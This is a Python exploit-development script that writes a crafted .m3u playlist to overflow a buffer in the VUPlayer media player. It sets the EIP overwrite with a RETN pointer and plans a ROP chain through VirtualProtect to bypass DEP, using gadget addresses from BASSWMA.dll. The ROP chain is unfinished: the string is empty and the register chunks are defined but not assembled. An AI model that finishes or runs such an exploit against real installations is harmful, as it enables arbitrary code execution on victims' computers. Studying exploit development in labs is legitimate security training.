import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop {COMPLETED}                                                
# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

# EAX Chunk Affects: EAX
eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
eax += struct.pack('<L', 0x90909090)

# ECX Chunk Affects: ECX
ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer

rop = ""

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += rop
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()